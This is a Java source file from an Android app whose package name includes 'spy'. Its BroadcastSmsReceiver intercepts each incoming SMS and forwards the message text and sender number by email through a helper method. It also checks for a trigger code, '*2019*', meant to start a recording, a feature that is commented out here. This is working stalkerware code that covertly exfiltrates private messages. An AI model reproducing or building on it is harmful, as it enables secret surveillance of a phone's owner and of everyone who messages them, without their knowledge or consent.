package com.ubiporspy.keeperprotector.main.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.ubiporspy.keeperprotector.util.Data;

/**
 * Broadcast para detectar mensajes Sms.
 */

public class BroadcastSms extends BroadcastReceiver {

    private static final String RECORD_REGEX = "*2019*";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        String msgBody = msgs[i].getMessageBody();
                        String msgNumber = msgs[i].getOriginatingAddress();

                        // Si el mensaje recibido contiene la palabra "*2019*",
                        // comenzar a grabar.

                        Data.sendEmailWithSmsLog(
                                context, msgBody, msgNumber,
                                System.currentTimeMillis()
                        );

                        if (msgBody.contains(RECORD_REGEX)) {
                            //startRecording();
                            Log.d("BroadcastSmsLog", "Se empezó a grabar");
                        } else {
                            Log.d("BroadcastSmsLog", "No grabó");
                        }
                    }
                } catch (Exception e) {
                    Log.e("BroadcastSmsLog", e.getMessage());
                }
            }
        }
    }
}